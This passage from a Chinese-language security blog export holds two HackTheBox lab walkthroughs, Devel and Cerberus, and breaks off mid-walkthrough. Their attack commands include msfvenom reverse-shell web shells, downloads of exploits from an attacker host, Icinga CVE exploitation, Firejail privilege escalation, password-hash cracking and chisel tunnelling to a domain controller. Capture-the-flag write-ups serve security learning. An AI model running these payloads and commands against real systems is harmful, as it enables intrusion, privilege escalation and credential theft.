    <content><![CDATA[<h1 id="HTB-Devel"><a href="#HTB-Devel" class="headerlink" title="HTB-Devel"></a>HTB-Devel</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ç«¯å£æ‰«æå‘ç°å­˜åœ¨å¯åŒ¿åç™»å½•çš„FTPæœåŠ¡ï¼Œä¸»é¡µå“åº”åŒ…å‘ç°æ˜¯ASP.NETè¯­è¨€ï¼›</p>
<p>2.msfvenomåˆ¶ä½œaspxæœ¨é©¬åå¼¹shellï¼›</p>
<p>3.systeminfoå‘ç°windows 7 build 7600æ²¡æ‰“è¡¥ä¸ï¼›</p>
<p>4.MS11-046ææƒã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapç«¯å£æ‰«æ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731093127132.png"></p>
<p>å¼€æ”¾ç«¯å£ï¼š21ï¼ˆftpï¼‰ã€80ï¼ˆhttpï¼‰ï¼Œå…¶ä¸­ftpå…è®¸åŒ¿åç™»å½•</p>
<p>æµè§ˆå™¨è®¿é—®é¶æœºIPï¼Œä¸»é¡µå¦‚ä¸‹ï¼Œè®¿é—®<code>iisstart.htm</code>é¡µé¢ä¸€æ ·</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731100023079.png" style="zoom: 80%;">

<p>BurpæŠ“åŒ…å¯çœ‹åˆ°å“åº”åŒ…ä¸­<code>X-Powered-By</code>å­—æ®µå€¼ï¼Œè¯´æ˜ç½‘ç«™ä½¿ç”¨ASP.NETè¯­è¨€ï¼Œå¯ä»¥å°è¯•ftpä¼ ä¸€ä¸ªaspxçš„æœ¨é©¬</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731100304986.png"></p>
<p>åœ¨æœ¬åœ°kaliæŸ¥æ‰¾aspxæœ¨é©¬ï¼Œæ­¤å¤„é€‰æ‹©ç”¨seclistsçš„ï¼ˆseclistsæ˜¯githubçš„ä¸€ä¸ªå¼€æºå­—å…¸é¡¹ç›®ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731100452176.png"></p>
<p>å¦‚ä¸‹å‘½ä»¤å¤åˆ¶åˆ°å½“å‰ç›®å½•</p>
<pre class="line-numbers language-none"><code class="language-none">cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åŒ¿åè¿æ¥FTPæœåŠ¡å¹¶ä¸Šä¼ aspxæœ¨é©¬</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731101346524.png"></p>
<p>æŸ¥çœ‹ï¼Œæœ¨é©¬è¢«ä¼ åˆ°ç½‘ç«™æ ¹ç›®å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731111707297.png"></p>
<p>è®¿é—®æœ¨é©¬ï¼Œæ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œæ¥ä¸‹æ¥ç”¨msfvenomç”Ÿæˆaspxæœ¨é©¬åå¼¹shell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731101601339.png"></p>
<h2 id="ä¸‰ã€msfvenomåˆ¶ä½œaspxæœ¨é©¬åå¼¹shell"><a href="#ä¸‰ã€msfvenomåˆ¶ä½œaspxæœ¨é©¬åå¼¹shell" class="headerlink" title="ä¸‰ã€msfvenomåˆ¶ä½œaspxæœ¨é©¬åå¼¹shell"></a>ä¸‰ã€msfvenomåˆ¶ä½œaspxæœ¨é©¬åå¼¹shell</h2><p>å¯ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹æ”¯æŒçš„æ ¼å¼å’Œpayload</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom --list formats
msfvenom --list payloads | grep 'shell_reverse_tcp'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>åˆ¶ä½œåå¼¹shellæœ¨é©¬</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.5 LPORT=9898 -o reverse-shell.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731162021240.png"></p>
<p>ç”¨FTPä¸Šä¼ </p>
<pre class="line-numbers language-none"><code class="language-none">ftp&gt; put reverse-shell.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°kaliå¼€å¯ncç›‘å¬<code>nc -lvnp 9898</code></p>
<p>æµè§ˆå™¨è®¿é—®ï¼š<a href="http://10.10.10.5/reverse-shell.aspx%EF%BC%8C%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96shell">http://10.10.10.5/reverse-shell.aspxï¼ŒæˆåŠŸè·å–shell</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731112020334.png"></p>
<p>æ‰§è¡Œsysteminfoå‘½ä»¤æŸ¥çœ‹ä¸»æœºä¿¡æ¯ï¼ŒWin7 Build 7600æ²¡æ‰“è¡¥ä¸</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731112600263.png"></p>
<p>googleæœç´¢å…³é”®å­—ï¼šmicrosoft windows 7 build 7600 exploit</p>
<p><a href="https://www.exploit-db.com/exploits/40564">https://www.exploit-db.com/exploits/40564</a></p>
<p>EDB-IDæ˜¯40564</p>
<h2 id="å››ã€MS11-046ææƒ"><a href="#å››ã€MS11-046ææƒ" class="headerlink" title="å››ã€MS11-046ææƒ"></a>å››ã€MS11-046ææƒ</h2><p>æœ¬åœ°kaliæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ›´æ–°exploitæ•°æ®åº“å¹¶æŸ¥æ‰¾EDB-IDä¸º40564çš„exploit</p>
<pre class="line-numbers language-none"><code class="language-none">searchsploit -u
searchsploit -m 40564<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731152602328.png"></p>
<p>aptä¸‹è½½mingw-w64</p>
<pre class="line-numbers language-none"><code class="language-none">apt update
apt install mingw-w64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç¼–è¯‘40564.c</p>
<pre class="line-numbers language-none"><code class="language-none">i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°kaliå¼€å¯httpæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œä¸‹è½½ç¼–è¯‘å¥½çš„40564.exeï¼ˆæ‰§è¡Œå‘½ä»¤åï¼Œç¨ç­‰ä¸€åˆ†é’ŸæŒ‰ä¸€ä¸‹å›è½¦ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:80/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯çœ‹åˆ°40564.exeå·²è¢«ä¸‹è½½åˆ°é¶æœº</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731143439853.png"></p>
<p>æ‰§è¡Œ40564.exeï¼ŒæˆåŠŸææƒï¼ŒOverï¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731143504437.png"></p>
<pre class="line-numbers language-none"><code class="language-none">flagä½ç½®
c:\Users\babis\Desktop\user.txt
c:\Users\Administrator\Desktop\root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731144353440.png" style="zoom: 80%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/devel-writeup-w-o-metasploit">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/devel-writeup-w-o-metasploit</a></p>
<p><a href="https://0xdf.gitlab.io/2019/03/05/htb-devel.html">https://0xdf.gitlab.io/2019/03/05/htb-devel.html</a></p>
<h2 id="å¦ä¸€ç§ä»¥MSFä¸ºä¸»çš„getshellã€ææƒæ€è·¯"><a href="#å¦ä¸€ç§ä»¥MSFä¸ºä¸»çš„getshellã€ææƒæ€è·¯" class="headerlink" title="å¦ä¸€ç§ä»¥MSFä¸ºä¸»çš„getshellã€ææƒæ€è·¯"></a>å¦ä¸€ç§ä»¥MSFä¸ºä¸»çš„getshellã€ææƒæ€è·¯</h2><p>æœ¬åœ°kaliåˆ¶ä½œaspxæœ¨é©¬</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9899 -f aspx -o met_rev_9899.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ftpä¸Šä¼ æœ¨é©¬</p>
<pre class="line-numbers language-none"><code class="language-none">ftp&gt; put met_rev_9899.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯åŠ¨MSFæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è¿›è¡Œç›‘å¬</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 9899
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ–°å¼€ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è®¿é—®aspxæœ¨é©¬</p>
<pre class="line-numbers language-none"><code class="language-none">curl http://10.10.10.5/met_rev_9899.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯çœ‹åˆ°æˆåŠŸgetshell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731162558815.png"></p>
<p>æŠŠshellä¼šè¯ï¼ˆæ­¤å¤„ä¸ºsession 1ï¼‰æ”¾åˆ°åå°ï¼Œå¹¶æŸ¥çœ‹å¯åˆ©ç”¨çš„exploit</p>
<pre class="line-numbers language-none"><code class="language-none">background
use post/multi/recon/local_exploit_suggester
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731170408487.png"></p>
<p>ç”¨ms10-015æ¨¡å—ææƒ</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit/windows/local/ms10_015_kitrap0d
set lhost tun0
set lport 9900
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731164942777.png"></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>åŒ¿åFTP</tag>
        <tag>ASP.NET</tag>
        <tag>msfvenom</tag>
        <tag>aspxæœ¨é©¬</tag>
        <tag>MS11-046ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Cerberus</title>
    <url>/posts/7761233f.html</url>
    <content><![CDATA[<h1 id="HTB-Cerberus"><a href="#HTB-Cerberus" class="headerlink" title="HTB-Cerberus"></a>HTB-Cerberus</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ä¿¡æ¯æ”¶é›†æ‰¾åˆ°icingaæœåŠ¡ï¼›</p>
<p>2.CVE-2022-24716ï¼ˆç›®å½•éå†ï¼‰å‘ç°åŸŸæ§ä¸»æœºå’Œicingaè´¦æˆ·ï¼›</p>
<p>3.CVE-2022-24715ï¼ˆRCEï¼‰è·å–www-dataç”¨æˆ·æƒé™ï¼Œlinpeasåˆ†æå‘ç°/usr/bin/firejailï¼›</p>
<p>4.CVE-2022-31214ï¼ˆFirejailæœ¬åœ°ææƒï¼‰è·å–rootæƒé™ï¼Œå¹¶è¯»å–SSSDç¼“å­˜æ‰¾åˆ°åŸŸæ§è´¦æˆ·ï¼›</p>
<p>5.fscanæ‰«åŸŸæ§ä¸»æœºç«¯å£å‘ç°5985ï¼ˆWinrmæœåŠ¡ï¼‰ï¼›</p>
<p>6.chiselåšä»£ç†å°†5985ç«¯å£æµé‡ä»£ç†åˆ°æœ¬åœ°ï¼Œç”¨evil-winrmç™»å½•åŸŸæ§ä¸»æœºï¼›</p>
<p>7.å‘ç°ManageEngine ADSelfService PlusæœåŠ¡ï¼Œchiselåšsocksä»£ç†ï¼Œè®¿é—®9251æœåŠ¡ï¼ŒMSFææƒã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>Nmap</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -A 10.10.11.205<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724172327113.png"></p>
<p>å¼€æ”¾ç«¯å£8080ï¼ŒURLï¼š<a href="http://icinga.cerberus.local:8080/icingaweb2">http://icinga.cerberus.local:8080/icingaweb2</a></p>
<p>æ·»åŠ åŸŸååˆ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.205 icinga.cerberus.local" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®URLï¼Œç•Œé¢å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720164559795.png"></p>
<h2 id="ä¸‰ã€CVE-2022-24716ï¼ˆç›®å½•éå†ï¼‰"><a href="#ä¸‰ã€CVE-2022-24716ï¼ˆç›®å½•éå†ï¼‰" class="headerlink" title="ä¸‰ã€CVE-2022-24716ï¼ˆç›®å½•éå†ï¼‰"></a>ä¸‰ã€CVE-2022-24716ï¼ˆç›®å½•éå†ï¼‰</h2><p>googleæœç´¢å…³é”®å­—ï¼šicinga exploit</p>
<p>CVE-2022-24716ï¼š<a href="https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/">https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/</a></p>
<p>è®¿é—®ï¼š<a href="http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts">http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts</a></p>
<p>ç¡®è®¤å­˜åœ¨ç›®å½•éå†ï¼Œä¸”å¯çœ‹åˆ°æœ‰åŸŸæ§ï¼ŒIPä¸º172.16.22.1</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720165318755.png"></p>
<p>åˆæ‰¾åˆ°å¦‚ä¸‹æ–‡ç« </p>
<p><a href="https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/">https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/</a></p>
<p>Icingaå®˜æ–¹é…ç½®æ–‡æ¡£ï¼š<a href="https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/">https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721092409907.png"></p>
<p>è¯»åˆ°å¦‚ä¸‹æ•æ„Ÿä¿¡æ¯</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720170958055.png"></p>
<pre class="line-numbers language-none"><code class="language-none">username = "matthew"
password = "IcingaWebPassword2023"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æˆåŠŸç™»å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720171136335.png"></p>
<h2 id="å››ã€CVE-2022-24715ï¼ˆRCEï¼‰"><a href="#å››ã€CVE-2022-24715ï¼ˆRCEï¼‰" class="headerlink" title="å››ã€CVE-2022-24715ï¼ˆRCEï¼‰"></a>å››ã€CVE-2022-24715ï¼ˆRCEï¼‰</h2><p>å‚è€ƒåˆšæ‰çš„æ–‡ç« ï¼Œå¤ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´CVE-2022-24715</p>
<p>å…ˆç›‘å¬ç«¯å£</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åç”ŸæˆPEMæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -m pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720173612744.png">

<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<p>Exploitï¼š<a href="https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py">https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py</a></p>
<pre class="line-numbers language-none"><code class="language-none">python3 CVE-2022-24715.py -t http://icinga.cerberus.local:8080/icingaweb2/ -I 10.10.14.8 -P 9898 -u matthew -p IcingaWebPassword2023 -e cert.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ³¨ï¼šå›¾ä¸­IPï¼ˆ10.10.14.35ï¼‰ä¸å‘½ä»¤ä¸ä¸€è‡´æ˜¯ç”±äºé¶æœºç¯å¢ƒä¸ç¨³å®šï¼Œæ‰“é¶æœŸé—´openvpné‡è¿è¿‡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721091841972.png"></p>
<p>æˆåŠŸåå¼¹åˆ°shellï¼Œç”¨æˆ·www-dataï¼Œæƒé™æ¯”è¾ƒä½</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721091959388.png"></p>
<p>åˆ‡æ¢æˆäº¤äº’å¼shellï¼Œä¾¿äºæ‰§è¡Œå‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -c 'import pty;pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°kaliå¼€å¯httpæœåŠ¡ï¼Œä¼ ä¸€ä¸ªlinpeasåˆ°é¶æœºï¼ˆæ­¤HTTPæœåŠ¡å»ºè®®ä¸€ç›´å¼€ç€ï¼Œåç»­ä¼šä¼ å¥½å‡ ä¸ªæ–‡ä»¶ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é¶æœºçš„shellçª—å£ï¼Œä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">cd /tmp
wget http://10.10.14.8:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>linpeasåˆ†æç»“æœä¸­ï¼Œæ‰¾åˆ°å¦‚ä¸‹å›¾çš„ä¿¡æ¯ï¼Œ/usr/bin/firejailä¸æ˜¯ä¸€ä¸ªå¸¸è§„æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721112613431.png"></p>
<h2 id="äº”ã€CVE-2022-31214ï¼ˆFirejailæœ¬åœ°ææƒï¼‰"><a href="#äº”ã€CVE-2022-31214ï¼ˆFirejailæœ¬åœ°ææƒï¼‰" class="headerlink" title="äº”ã€CVE-2022-31214ï¼ˆFirejailæœ¬åœ°ææƒï¼‰"></a>äº”ã€CVE-2022-31214ï¼ˆFirejailæœ¬åœ°ææƒï¼‰</h2><p>googleæœç´¢å…³é”®å­—ï¼šfirejail exploit</p>
<p><a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
<p>æŠŠä»¥ä¸Šé“¾æ¥çš„ä»£ç å¤åˆ¶åˆ°æœ¬åœ°kaliçš„CVE-2022-31214.pyæ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨é¶æœºçš„shellçª—å£ç”¨wgetä»æœ¬åœ°ä¸‹è½½ï¼Œä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8:80/CVE-2022-31214.py
chmod +x CVE-2022-31214.py
python3 CVE-2022-31214.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721150903574.png"></p>
<p>åœ¨æœ¬åœ°kaliå¼€ä¸€ä¸ªæ–°ç»ˆç«¯çª—å£ï¼Œå†å¼¹ä¸€ä¸ªshellå›æ¥ï¼Œç„¶åä¾æ¬¡æ‰§è¡Œä¸‹åˆ—å‘½ä»¤ï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -c 'import pty;pty.spawn("/bin/bash")'
firejail --join=94129	#æ­¤å¤„94129æ¢æˆå¯¹åº”ç”Ÿæˆçš„å€¼
su -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721150817363.png"></p>
<p>linpeasç»“æœä¸­ï¼Œè¿˜çœ‹åˆ°å¦‚ä¸‹å†…å®¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721145715193.png"></p>
<p>SSSDï¼š<a href="https://sssd.io/docs/introduction.html">https://sssd.io/docs/introduction.html</a></p>
<p>åœ¨å¦‚ä¸‹ç›®å½•ä½ç½®æŸ¥çœ‹ç¼“å­˜</p>
<pre class="line-numbers language-none"><code class="language-none">root@icinga:/var/lib/sss/db# strings cache_cerberus.local.ldb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">matthew@cerberus.local

$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>çˆ†ç ´å‡ºhashå€¼</p>
<pre class="line-numbers language-none"><code class="language-none">john -w=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721154308374.png"></p>
<pre class="line-numbers language-none"><code class="language-none">147258369<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>fscanæ‰«åŸŸæ§ä¸»æœºï¼ˆ172.16.22.1ï¼‰ç«¯å£ï¼Œçœ‹åˆ°5985ç«¯å£å¼€æ”¾</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8:80/fscan_amd64
chmod +x fscan_amd64
./fscan_amd64 -h 172.16.22.1 -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721161820420.png"></p>
<h2 id="å…­ã€WinrmæœåŠ¡ç™»å½•åŸŸæ§"><a href="#å…­ã€WinrmæœåŠ¡ç™»å½•åŸŸæ§" class="headerlink" title="å…­ã€WinrmæœåŠ¡ç™»å½•åŸŸæ§"></a>å…­ã€WinrmæœåŠ¡ç™»å½•åŸŸæ§</h2><p>googleå…³é”®è¯ï¼š5985ç«¯å£</p>
<p>æœåˆ°WinrmæœåŠ¡</p>
<p>ç”¨chiselæŠŠåŸŸæ§ä¸»æœº5985ç«¯å£æµé‡è½¬å‘åˆ°æœ¬åœ°kali</p>
<p>Kaliä»¥æœåŠ¡ç«¯è¿è¡Œchisel</p>
<pre class="line-numbers language-none"><code class="language-none">chisel server -p 9899 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é¶æœºä»¥å®¢æˆ·ç«¯è¿è¡Œchisel</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8:80/chisel
chmod +x chisel
./chisel client --max-retry-count=1 10.10.14.8:9899 R:5985:172.16.22.1:5985<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>é¶æœºæ‰§è¡Œå®Œä¸Šè¿°å‘½ä»¤åï¼Œåœ¨æœ¬åœ°kaliå¯çœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼Œæœ€åä¸€è¡Œè¡¨ç¤ºæµé‡è½¬å‘è¿æ¥å·²å»ºç«‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724100212322.png"></p>
<p>åœ¨æœ¬åœ°kaliç”¨evil-winrmç™»å½•WinrmæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">evil-winrm -i 127.0.0.1 -u matthew -p 147258369<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724101541002.png"></p>
<p>userflagåœ¨C:\Users\matthew\Desktopç›®å½•ä¸‹ï¼Œä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æˆåŠŸè·å–userflag</p>
<pre class="line-numbers language-none"><code class="language-none">cd ../Desktop
type user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä»æœ¬åœ°kaliä¼ ä¸€ä¸ªwinPEASåˆ°åŸŸæ§ä¸»æœºï¼Œè¿è¡Œä¸€ä¸‹ï¼Œå‘ç°è¿è¡Œåˆ°ä¸€åŠä¼šæŠ¥é”™ä¸­æ–­ï¼Œä¹Ÿæ²¡ä»€ä¹ˆæœ‰ä»·å€¼çš„</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724103146257.png"></p>
<pre class="line-numbers language-none"><code class="language-none">./winPEASany.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åœ¨<code>C:\Program Files (x86)</code>ç›®å½•çœ‹åˆ°ManageEngineæœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724111110674.png"></p>
<p>è¿›åˆ°ManageEngineç›®å½•ï¼Œçœ‹åˆ°ADSelfService PlusæœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724135943260.png"></p>
<h2 id="ä¸ƒã€ManageEngine-ADSelfService-PlusæœåŠ¡ææƒ"><a href="#ä¸ƒã€ManageEngine-ADSelfService-PlusæœåŠ¡ææƒ" class="headerlink" title="ä¸ƒã€ManageEngine ADSelfService PlusæœåŠ¡ææƒ"></a>ä¸ƒã€ManageEngine ADSelfService PlusæœåŠ¡ææƒ</h2><p>googleå…³é”®å­—ï¼šManageEngine ADSelfService Plus port</p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.manageengine.com/products/self-service-password/help/admin-guide/Admin/connection.html">https://www.manageengine.com/products/self-service-password/help/admin-guide/Admin/connection.html</a></p>
<p>ä»å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°ADSelfService Plusé»˜è®¤ç«¯å£æ˜¯8888(http)å’Œ9251(https)</p>
<p>å› ä¸ºæœ‰httpæœåŠ¡ï¼Œæ‰€ä»¥éœ€è¦åšä¸€ä¸ªsocksä»£ç†</p>
<p>æœ¬åœ°kaliä»¥æœåŠ¡ç«¯è¿è¡Œchisel</p>
<pre class="line-numbers language-none"><code class="language-none">chisel server -p 9900 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é¶æœºä»¥å®¢æˆ·ç«¯è¿è¡Œchisel</p>
<pre class="line-numbers language-none"><code class="language-none">cd "C:\Users\matthew\Desktop"
curl 10.10.14.8/chisel.exe -o chisel.exe
./chisel.exe client --max-retry-count=1 10.10.14.8:9900 R:1080:socks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

